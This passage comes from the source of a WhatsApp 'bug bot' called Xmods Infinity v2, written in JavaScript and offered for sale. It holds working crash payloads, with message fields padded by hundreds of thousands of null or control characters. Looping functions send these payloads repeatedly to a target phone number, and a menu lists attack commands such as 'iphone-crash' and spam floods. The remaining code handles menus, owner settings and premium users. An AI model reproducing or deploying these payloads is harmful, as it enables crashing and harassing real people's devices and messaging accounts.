 paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"sockAttack\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"sockire@cloud.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
 500000
 )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
 version: 3,
 },
 },
 },
 };

 async function DanzyKilliOS(target) {
 danzy.relayMessage(
 target,
 {
 extendedTextMessage: {
 text: `Bang Lu Kenapa` + "࣯\u0003".repeat(90000),
 contextInfo: {
 fromMe: false,
 stanzaId: target,
 participant: target,
 quotedMessage: {
 conversation: " Lu Kenapa" + "\u0003".repeat(90000),
 },
 disappearingMode: {
 initiator: "CHANGED_IN_CHAT",
 trigger: "CHAT_SETTING",
 },
 },
 inviteLinkGroupTypeV2: "DEFAULT",
 },
 },
 {
 participant: {
 jid: target,
 quoted: sockireKING
 },
 },
 {
 messageId: null,
 }
 );
 }
 
//================= FUN BUG BLANK =====================//
async function danzyblank(target) {
for (let i = 0; i <= 100; i++) {
await Blankhard(target);
await bugdanzy3(target);
await Crashblank(target);
await bugdanzy4(target);
await blanks(target);
await bugdanzy2(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${target}⚡`));
} 

async function danzyblanknew(target) {
for (let i = 0; i <= 50; i++) {
await Blankhard(target);
await sleep(5000)    
await bugdanzy3(target);
await sleep(5000)      
await invicXblank(target); 
await sleep(5000)       
await bugdanzy4(target);
await sleep(5000)        
await bugdanzy3(target);
await sleep(5000)        
await bugdanzy2(target);
await sleep(5000)      
await Blankhard(target);
await sleep(5000)      
await bugdanzy3(target);
await sleep(5000)      
await invicXblank(target); 
await sleep(5000)        
await bugdanzy4(target);
await sleep(5000)      
await Blankhard(target);
await sleep(5000)        
await bugdanzy2(target);
}
console.log(chalk.blue(`Sending Crash Hard to ${target}⚡`));
}
//=======================================//
async function FcBeta(target) {
    for (let i = 0; i <= 30; i++) {
    await carouselNew(target);
    await carouselNew(target);
    }
}

//=======================================//
async function XmodsDelay1(target) {
    for (let i = 0; i <= 200; i++) {
    await protocobug5(target);
    await delaybugv5(target);
    }
}

//================= IOS ======================//
async function ForcloseWihope(target) {
  for (let i = 0; i < 80; i++) {
    await ShadowIos(target);
    await VenCrash(target);
    await DanzyKilliOS(target);
    await DanzyIos(target);
  }
}
// AKHIR FUNC BUG //
//=======================================//
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}}

async function edit2 (tex1, tex2) {
var nln = [
`${tex1}`,
`${tex2}`
]
let { key } = await danzy.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await danzy.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}

async function edit3 (tex1, tex2, tex3) {
var nln = [
`${tex1}`,
`${tex2}`,
`${tex3}`
]
let { key } = await danzy.sendMessage(from, {text: 'Loading...'},  { quoted: m })
let duh = randomNomor(800, 1000)
for (let i = 0; i < nln.length; i++) {
await sleep(duh)
await danzy.sendMessage(from, {text: nln[i], edit: key }, { quoted: m });
}}  

async function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
//==========================================//

// Done Ress //
async function doneress () {
if (!q) throw "Done Response"
let pepec = q.replace(/[^0-9]/g, "")
let ressdone = `\`( - ) 𝐁𝐨𝐭 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐒𝐞𝐧𝐝𝐬 𝐀 𝐕𝐢𝐫𝐮𝐬 𝐓𝐨 ${pepec} 🎯\`
> ( - ) 𝐓𝐲𝐩𝐞 : _*${command}*_
> ( - ) 𝐏𝐥𝐞𝐚𝐬𝐞 𝐖𝐚𝐢𝐭 𝟓 𝐌𝐢𝐧𝐮𝐭𝐞𝐬❕`

  let buttons = [
        { buttonId: ".xmenu", buttonText: { displayText: "Back To Menu" } }, 
         { buttonId: ".scriptxmods", buttonText: { displayText: "Buy Script" } }
    ];

    let buttonMessage = {
        image: thumb, 
        caption: ressdone,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363314734246493@newsletter",
                newsletterName: "𝐗𝐦𝐨𝐝𝐬 𝐈𝐧𝐟𝐢𝐧𝐢𝐭𝐲🦠"
            }
        },
        footer: "©Xmods Infinity v2",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
    };
await danzy.sendMessage(m.chat, buttonMessage, { quoted: cursor });
}

// Random Emoji //       
const Moji1 = '🌸'
const Moji2 = '🍁'
const Moji3 = '🍃'
const ERandom = [Moji1, Moji2, Moji3]
let Feature = Math.floor(Math.random() * ERandom.length)
const emoji = ERandom[Feature]

        // Thumb Bot //

const thumb = fs.readFileSync('./menu.png');

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('Xmods.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('Terjadi kesalahan:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `▢ Halo Kak @${pushname}, Apakah kakak sedang mencari ${prefix+mean}?\n▢ Nama menu : ${prefix+mean}`
let buttons = [
        { buttonId: `.${mean}`, buttonText: { displayText: `${mean}` } }
    ];

    let buttonMessage = {
        image: fs.readFileSync('./menu.png'), 
        caption: response,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363314734246493@newsletter",
                newsletterName: "𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎"
            }
        },
        footer: "© Xmods Infinity v2",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await danzy.sendMessage(m.chat, buttonMessage, { quoted: m })
}}

const sound = { 
key: {
fromMe: false, 
participant: `18002428478@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 9999999999999,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

async function quickreply1(chat, teks, quick1, jm) {
let msg = generateWAMessageFromContent(chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999999, 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + "120363311920743499@newsletter",
newsletterName: `ᴄʜᴀɴɴᴇʟ ${wm}`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: danzy.decodeJid(danzy.user.id) },
},
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `ʙʏ ${wm}`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: '',
subtitle: '',
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "quick_reply",
"buttonParamsJson": quick1
}
],
})})
}}
}, { quoted: jm }) //ori (floc)

await danzy.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
}

const daf = {
    key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
    },
    message: {
        productMessage: {
            product: {
                title: `𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎`,
                description: `${pushname} order`,
                currencyCode: "IDR",
                priceAmount1000: "1000000000000",
                retailerId: `𝙳𝚊𝚗𝚣𝚢 𝙳𝚎𝚟`,
                productImageCount: 1,
                productImage: {
                    mimetype: "image/jpeg",
                    jpegThumbnail: await getBuffer("https://files.catbox.moe/2ylm5g.jpg") // Ambil gambar sebagai buffer
                }
            },
            businessOwnerJid: `0@s.whatsapp.net`,
        },
    },
};

const ftoko = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        productMessage: {
          product: {
            title: `𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎`,
            description: `${pushname} order`,
            currencyCode: "IDR",
            priceAmount1000: "1000000000000",
            retailerId: `𝙳𝚊𝚗𝚣𝚢 𝙳𝚎𝚟`,
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
const hw = {
  key: {
    participant: '180024284@s.whatsapp.net', 
    ...(m.chat ? {remoteJid: `status@broadcast`} : {})
  }, 
  message: {
    liveLocationMessage: {
      caption: `©𝙳𝚊𝚗𝚣𝚢 𝙳𝚎𝚟`,
      jpegThumbnail: fs.readFileSync('./menu.png'), 
      thumbnailUrl: `https://files.catbox.moe/2ylm5g.jpg`,
    }
  }, 
quoted: sound
} 
//=======≠======≠=≠≠==≠==============≠=====//
const DanzyReply = async (teks) => {
    await sleep(100);
    
    return danzy.sendMessage(
        m.chat,
        {
            contextInfo: {
                mentionedJid: [m.sender],
                externalAdReply: {
                    showAdAttribution: false,
                    renderLargerThumbnail: false,
                    title: `𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎︎`,
                    body: `𝙳𝚊𝚗𝚣𝚢 𝙳𝚎𝚟`,
                    previewType: "VIDEO",
                    thumbnail: thumb,
                    sourceUrl: `https://youtube.com/@Danzy-dev`,
                    mediaUrl: `https://wa.me/6285173259367`
                }
            },
            text: teks
        },
        { quoted: m }
    );
};

//=======================================//
const PayX = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: "@s.whatsapp.net"
				} : {})
			},
			"message": {
				"orderMessage": {
					"orderId": "594071395007984",
					"thumbnail": fs.readFileSync('./menu.png'),
					"thumbnailUrl": `https://files.catbox.moe/2ylm5g.jpg`,
					"itemCount": 9741,
					"status": "INQUIRY",
					"surface": "CATALOG",
					"message": `Sender : @${pushname}\nCommand : ${command}`,
					"orderTitle": "Danzy Developer",
					"sellerJid": "18002428478@s.whatsapp.net",
					"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
					"totalAmount1000": "9741",
					"totalCurrencyCode": "USD"
				}
			}
		}


    const isCreator = JSON.parse(fs.readFileSync('./lib/Database/owner.json'));

    const isAccDanzyDev = [botNumber, ...isCreator, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);

const reply = (teks) => { 
danzy.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎`,"body": `© 𝙳𝚊𝚗𝚣𝚢 𝙳𝚎𝚟`, "previewType": "PHOTO","thumbnailUrl": `https://files.catbox.moe/2ylm5g.jpg`}}}, { quoted: hw})} 

const reaction = async (jidss, emoji) => {
danzy.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;

switch (command) {
case "menu": case "xmenu": case "xmodsmenu": {

   await danzy.sendMessage(m.chat, { react: { text: `🕊`, key: m.key } });
      
   const fs = require('fs'); // Untuk baca file
    
   const captionnya = `
*──( 👀 ) Ola' ${info} 👋*
╰➢  Привет, я Xmods Infinity. Используйте этого бота WhatsApp с умом!🕊
─────────────────────────
\`──( 🇷🇺 ) 𝐗͢𝐌͡𝐎⍣𝐃𝐒 ☇ 𝟐.𝟎-𝐅͢𝐑͡𝐄𝐄\`
✧ 𝔅𝔬𝔱 𝔑𝔞𝔪𝔢 : 𝚇𝚖𝚘𝚍𝚜 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢🩸
✧ V𝔢𝔯𝔰𝔦𝔬𝔫 : 𝟸.𝟶 ☇
✧ ℭ𝔯𝔢𝔞𝔱𝔬𝔯 : 𝚍𝚊𝚗𝚣𝚢𝚢𝟷🐉

> 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 𝙼𝚎𝚗𝚞 𝙳𝚒𝚋𝚊𝚠𝚊𝚑 𝙸𝚗𝚒.`;

   let buttons = [
  {
    buttonId: `.bugmenu`, 
    buttonText: { 
      displayText: '𝑨͢͡𝑻𝑻𝑨𝑪𝑲 𝑴͢͡𝑬𝑵𝑼' 
    }
  }, {
    buttonId: ".ownermenu", 
    buttonText: {
      displayText: "𝑶͢͡𝑾𝑵𝑬𝑹 𝑴͠𝑬𝑵𝑼"
    }
   }, {
   buttonId: ".funmenu", 
    buttonText: {
      displayText: "𝑭͢͡𝑼𝑵 𝑴͠𝑬𝑵𝑼"
    }
  }
]

   let buttonMessage = {
        image: { url: `https://files.catbox.moe/nsle74.jpg` }, // Ganti video ke image
        caption: captionnya,
        contextInfo: {
          externalAdReply: {
            showAdAttribution: true,
            title: `🩸⃟༑⌁⃰𝐗͢𝐦𝐨𝐝𝐬 𝐈𝐧ͯ𝐟𝐢𝐧͢𝐢𝐭𝐲ཀ͜͡🦠️`,
            body: `𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟐.𝟎 𝐅͢𝐫͡𝐞𝐞`,
            thumbnailUrl: `https://files.catbox.moe/2ylm5g.jpg`,
            sourceUrl: `https://whatsapp.com/channel/0029Vajenbo0LKZKlzkxH30Q`,
            mediaType: 1,
            renderLargerThumbnail: true
          }
        },
        footer: "©𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟐.𝟎 𝐅͢𝐫͡𝐞𝐞",
        buttons: buttons,
        viewOnce: true,
        headerType: 4 // headerType 4 untuk gambar
   };

   await danzy.sendMessage(m.chat, buttonMessage, { quoted: PayX });       
   await danzy.sendMessage(m.chat, {audio: fs.readFileSync('./sound/menu.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: ftoko});
  }
break


case "bugmenu": case "bugxmods": {
await danzy.sendMessage(m.chat, { react: { text: `☠️`, key: m.key } });

let msgbug = `
*──( 👀 ) Ola' ${info} 👋*
╰➢  Привет, я Xmods Infinity. Используйте этого бота WhatsApp с умом!🕊
─────────────────────────
\`──( 🇷🇺 ) 𝐗͢𝐌͡𝐎⍣𝐃𝐒 ☇ 𝟐.𝟎-𝐅͢𝐑͡𝐄𝐄\`
✧ 𝔅𝔬𝔱 𝔑𝔞𝔪𝔢 : 𝚇𝚖𝚘𝚍𝚜 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢🩸
✧ V𝔢𝔯𝔰𝔦𝔬𝔫 : 𝟸.𝟶 ☇
✧ ℭ𝔯𝔢𝔞𝔱𝔬𝔯 : 𝚍𝚊𝚗𝚣𝚢𝚢𝟷🐉

\`[ ♢ ] 𝗕𝘂𝗴 𝗗𝗲𝗹𝗮𝘆 𝗜𝗻𝘃𝗶𝘀 𝗙𝗲𝗮𝘁𝘂𝗿𝗲\`
* .invis-hard 628xxx
* .fc-beta 628xxx 
\`[ ♢ ] 𝗜𝗽𝗵𝗼𝗻𝗲 𝗕𝘂𝗴𝘀 𝗙𝗲𝗮𝘁𝘂𝗿𝗲\`
* .iphone-crash 628xxx
* .iphone-crash-home 628xxx
\`[ ♢ ] 𝗦𝗽𝗮𝗺 𝗙𝗲𝗮𝘁𝘂𝗿𝗲\`
* .clearbug 628xxx
* .spamripper 628xxx
* .spamyatim 628xxx
\`[ ♢ ] 𝗕𝘂𝗴 𝗕𝗹𝗮𝗻𝗸 𝗨𝗶 𝗙𝗲𝗮𝘁𝘂𝗿𝗲\`
* .flow-ui 628xxx
* .flow-blank`

let buttons = [
  { 
    buttonId: ".danzyganteng", 
    buttonText: { 
      displayText: "𝑫͢͡𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹" 
    } 
  }, 
  { 
    buttonId: ".thanksto", 
    buttonText: { 
      displayText: "𝑻͢͡𝑯𝑨𝑵𝑲𝑺 𝑻͠𝑶" 
    } 
  }
];

let buttonMessage = {
  image: fs.readFileSync('./menu.png'), 
  caption: msgbug, 
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363314734246493@newsletter",
      newsletterName: "🩸⃟༑⌁⃰𝐗͢𝐦𝐨𝐝𝐬 𝐈𝐧ͯ𝐟𝐢𝐧͢𝐢𝐭𝐲ཀ͜͡🦠️"
    }
  },
  footer: "©𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟐.𝟎 𝐅͢𝐫͡𝐞𝐞",
  buttons: buttons,
  viewOnce: true,
  headerType: 6 
};

await danzy.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}
break

case "ownermenu": {
let msgown = `
*──( 👀 ) Ola' ${info} 👋*
╰➢  Привет, я Xmods Infinity. Используйте этого бота WhatsApp с умом!🕊
─────────────────────────
\`──( 🇷🇺 ) 𝐗͢𝐌͡𝐎⍣𝐃𝐒 ☇ 𝟐.𝟎-𝐅͢𝐑͡𝐄𝐄\`
✧ 𝔅𝔬𝔱 𝔑𝔞𝔪𝔢 : 𝚇𝚖𝚘𝚍𝚜 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢🩸
✧ V𝔢𝔯𝔰𝔦𝔬𝔫 : 𝟸.𝟶 ☇
✧ ℭ𝔯𝔢𝔞𝔱𝔬𝔯 : 𝚍𝚊𝚗𝚣𝚢𝚢𝟷🐉

\`[ ♢ ] 𝗢𝘄𝗻𝗲𝗿 𝗙𝗲𝗮𝘁𝘂𝗿𝗲\`
* .addprem 628xxx
* .delprem 628xxx
* .public
* .self`
let buttons = [
  { 
    buttonId: ".danzyganteng", 
    buttonText: { 
      displayText: "𝑫͢͡𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹" 
    } 
  }, 
  { 
    buttonId: ".thanksto", 
    buttonText: { 
      displayText: "𝑻͢͡𝑯𝑨𝑵𝑲𝑺 𝑻͠𝑶" 
    } 
  }
];

let buttonMessage = {
  image: fs.readFileSync('./menu.png'), 
  caption: msgown, 
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363314734246493@newsletter",
      newsletterName: "🩸⃟༑⌁⃰𝐗͢𝐦𝐨𝐝𝐬 𝐈𝐧ͯ𝐟𝐢𝐧͢𝐢𝐭𝐲ཀ͜͡🦠️"
    }
  },
  footer: "©𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟐.𝟎 𝐅͢𝐫͡𝐞𝐞",
  buttons: buttons,
  viewOnce: true,
  headerType: 6 
};

await danzy.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}
break


case "funmenu": {
let msgfun = `
*──( 👀 ) Ola' ${info} 👋*
╰➢  Привет, я Xmods Infinity. Используйте этого бота WhatsApp с умом!🕊
─────────────────────────
\`──( 🇷🇺 ) 𝐗͢𝐌͡𝐎⍣𝐃𝐒 ☇ 𝟐.𝟎-𝐅͢𝐑͡𝐄𝐄\`
✧ 𝔅𝔬𝔱 𝔑𝔞𝔪𝔢 : 𝚇𝚖𝚘𝚍𝚜 𝙸𝚗𝚏𝚒𝚗𝚒𝚝𝚢🩸
✧ V𝔢𝔯𝔰𝔦𝔬𝔫 : 𝟸.𝟶 ☇
✧ ℭ𝔯𝔢𝔞𝔱𝔬𝔯 : 𝚍𝚊𝚗𝚣𝚢𝚢𝟷🐉

\`[ ♢ ] 𝗙𝘂𝗻 𝗙𝗲𝗮𝘁𝘂𝗿𝗲\`
* .hidetag 
* .enchard 
* .tourl 
* .tt
* .qc
* .idch
* .aiimage
* .spamtag 
`
let buttons = [
  { 
    buttonId: ".danzyganteng", 
    buttonText: { 
      displayText: "𝑫͢͡𝑬𝑽𝑬𝑳𝑶𝑷𝑬𝑹" 
    } 
  }, 
  { 
    buttonId: ".thanksto", 
    buttonText: { 
      displayText: "𝑻͢͡𝑯𝑨𝑵𝑲𝑺 𝑻͠𝑶" 
    } 
  }
];

let buttonMessage = {
  image: fs.readFileSync('./menu.png'), 
  caption: msgfun, 
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363314734246493@newsletter",
      newsletterName: "🩸⃟༑⌁⃰𝐗͢𝐦𝐨𝐝𝐬 𝐈𝐧ͯ𝐟𝐢𝐧͢𝐢𝐭𝐲ཀ͜͡🦠️"
    }
  },
  footer: "©𝐕͢𝐞͡𝐫⍣𝐬͢𝐢͠𝐨᷼𝐧 𝟐.𝟎 𝐅͢𝐫͡𝐞𝐞",
  buttons: buttons,
  viewOnce: true,
  headerType: 6 
};

await danzy.sendMessage(m.chat, buttonMessage, { quoted: PayX });
}
break


case 'owner': case "danzyganteng": {
danzy.sendMessage(from, {react: {text: "👤", key: m.key}})
let menu = `
*\`𝘾𝙊𝙉𝙏𝘼𝘾𝙏𝙎 𝙊𝙒𝙉𝙀𝙍\`*

*👋 ʜɪ ᴋᴀᴋ*
_ᴄᴏɴᴛᴀᴄᴛꜱ ᴄʀᴇᴀᴛᴏʀ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ_
_ᴍᴏʜᴏɴ ᴜɴᴛᴜᴋ ᴛɪᴅᴀᴋ ꜱᴘᴀᴍ ᴀᴛᴀᴜᴘᴜɴ ᴛᴇʟᴇᴘᴏɴ ᴛᴇʀɪᴍᴀᴋᴀꜱɪʜ._
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterName: `𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎`,
 newsletterJid: "120363314734246493@newsletter",
 serverMessageId: 143
},
 businessMessageForwardInfo: { businessOwnerJid: danzy.decodeJid(danzy.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: menu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: "𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎"
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "",
 hasMediaAttachment: true,
 ...(await prepareWAMessageMedia({ image: thumb }, { upload: danzy.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"ᴏᴡɴᴇʀ\",\"url\":\"https://wa.me/6285173259367\",\"merchant_url\":\"https://wa.me/6285173259367\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"sᴀʟᴜʀᴀɴ ɪɴғᴏ ᴜᴘᴅᴀᴛᴇ sᴄ\",\"url\":\"https://whatsapp.com/channel/0029VahUbrs90x2wGeaWAc14\",\"merchant_url\":\"https://wa.me/6285173259367\"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"sᴀʟᴜʀᴀɴ ᴅᴇᴠ\",\"url\":\"https://whatsapp.com/channel/0029Vajenbo0LKZKlzkxH30Q\",\"merchant_url\":\"https://wa.me/6285173259367\"}`
}],
 })
 })
 }
 }
}, {})

await danzy.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'addprem': {
  if (!isOwner) return reply('❌ Fitur ini hanya bisa digunakan oleh Owner.');
  if (!q) return reply(`Penggunaan: ${prefix + command} 628xxxxx`);

  const nomor = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let ownerList = [];

  try {
    ownerList = JSON.parse(fs.readFileSync('./lib/Database/owner.json'));
  } catch {
    ownerList = [];
  }

  if (ownerList.includes(nomor)) return reply(`✅ Nomor ${nomor} sudah termasuk user premium.`);

  ownerList.push(nomor);
  fs.writeFileSync('./lib/Database/owner.json', JSON.stringify(ownerList, null, 2));
  reply(`Si yatim ${nomor} berhasil ditambahkan ke daftar premium.`);
}
break

case 'delprem': {
  if (!isOwner) return reply('❌ Fitur ini hanya bisa digunakan oleh Owner.');
  if (!q) return reply(`Penggunaan: ${prefix + command} 628xxxxx`);

  const nomor = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  let ownerList = [];

  try {
    ownerList = JSON.parse(fs.readFileSync('./lib/Database/owner.json'));
  } catch {
    return reply('⚠️ Gagal membaca database premium.');
  }

  if (!ownerList.includes(nomor)) return reply(`❌ Nomor ${nomor} tidak ditemukan dalam daftar premium.`);

  ownerList = ownerList.filter(n => n !== nomor);
  fs.writeFileSync('./lib/Database/owner.json', JSON.stringify(ownerList, null, 2));
  reply(`Si yatim ${nomor} berhasil dihapus dari daftar premium.`);
}
break

case "public": { 
if (!isBot) return DanzyReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
danzy.public = true
DanzyReply(`*\`Succes Beralih mode ke mode public\`*`)
}
break
case "self": { 
if (!isBot) return DanzyReply(`\`Fitur ini hanya dapat di akses oleh owner bot\``)
danzy.public = false
DanzyReply(`*\`Succes Beralih mode ke mode self\`*`)
}
break

case "tqto": case "thanksto": {
let msgbug = `*\`▧ 「 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 𝗠𝗬 𝗙𝗥𝗜𝗘𝗡𝗗𝗦 」\`*

- danzyy1 [ developer ]
- ALLBUYER
`
let buttons = [
        { buttonId: ".xmenu", buttonText: { displayText: "ＢＡＣＫ ＴＯ ＭＥＮＵ" } }
    ];

    let buttonMessage = {
         image: fs.readFileSync('./menu.png'), 
        caption: msgbug,
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363314734246493@newsletter",
                newsletterName: "𝐗͢𝐌͡𝐎͢𝐃͡𝐒 𝐈͢𝐍͜͢𝐅͢𝐈ͯ𝐍𝐈𝐓𝐘 𝐕͢𝟐.𝟎"
            }
        },
        footer: "𝙳𝚊𝚗𝚣𝚢 𝙳𝚎𝚟",
        buttons: buttons,
        viewOnce: true,
        headerType: 6
  };
await danzy.sendMessage(m.chat, buttonMessage, { quoted: ftoko });
}
break;

case 'script': case "scriptxmods": {
let buy = `*\`▧ 「 𝗕𝗨𝗬 - 𝗦𝗖𝗥𝗜𝗣𝗧  - 𝗫𝗠𝗢𝗗𝗦 𝗜𝗡𝗙𝗜𝗡𝗜𝗧𝗬 」\`*
╭─────────────────
│友 *\`MAU BELI SC INI?\`*
│
│- *xᴍᴏᴅs ɪɴғɪɴɪᴛʏ 𝚙𝚛𝚒𝚟𝚊𝚝 ᴠ2.0 𝟹𝟻𝙺 -*
│
│友 *Contact1 : t.me/danzyy1
╰─────────────────`
danzy.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 40000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
await sleep(2500)
DanzyDevStickSc()
}
break

case "hidetag":
case "h": {
    const isOwner = ownerbot.includes(sender);  // validasi owner

    if (!m.isGroup) return reply("❌ Fitur ini hanya untuk grup.");
    if (!isOwner) return reply("❌ Fitur ini hanya untuk Owner.");
